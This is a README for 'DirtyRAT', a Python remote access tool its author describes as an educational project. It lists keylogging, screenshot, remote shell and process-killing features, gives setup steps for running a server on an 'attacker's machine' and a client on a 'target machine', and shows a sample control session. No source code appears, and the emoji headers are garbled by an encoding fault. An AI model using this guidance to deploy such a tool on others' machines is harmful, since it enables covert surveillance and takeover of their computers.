DirtyRAT is a lightweight Remote Access Tool (RAT) built in Python for educational purposes only.
It allows you to experiment with keylogging, screenshots, shell commands, and system/process info over a basic TCP connection.

This project was created as part of my learning journey into ethical hacking, scripting, and penetration testing.

# ‚öôÔ∏è Features

üì° Reverse TCP connection (client to server)

‚å®Ô∏è Keystroke logging

üì∑ Screenshot capture

üíª System information retrieval

üíé Shell command execution

üîç List running processes

‚ùå Kill process by PID

# üîß Requirements

Python 3.8+

OS: Windows (for client), server can run on any OS with Python

Python packages:

pynput

psutil

Pillow

Install dependencies with:

pip install -r requirements.txt

# üöÄ Getting Started

Clone the repo and go to the project folder:

git clone https://github.com/yourusername/dirtylabs.git
cd dirtylabs/DirtyRAT

Install requirements:

pip install -r requirements.txt

Run the server (on attacker's machine):

python ser2.py

Run the client (on target machine):

python cli2.py

‚ö†Ô∏è Ensure both machines are on the same LAN or connected via VPN.

# üíª Server Usage Example

rat> help
Commands: help, get_logs, screenshot, shell <cmd>, system_info, list_processes, kill_process <pid>

rat> system_info
{'OS': 'Windows-11', 'CPU': 'Intel i7', 'RAM': '16.0 GB', 'User': 'target'}

rat> screenshot
[+] Screenshot saved as screenshots/screenshot_20250704_173922.png

rat> shell whoami
target-pc\\target

# üìå Notes

Screenshots are saved in screenshots/

Binary data fallback goes to unknown/

Keylogs may appear empty until some keys are typed

Shell output uses .decode(errors="ignore") to avoid crashes

Windows Defender or antivirus may detect keylogger behavior

Admin privileges may be needed for firewall access or keyboard hooks

# üßê Final Note

DirtyRAT is my first attempt to build a remote tool as I enter the world of cybersecurity and scripting.
It still needs many improvements, but it helped me learn a lot about sockets, shell interaction, and system control.
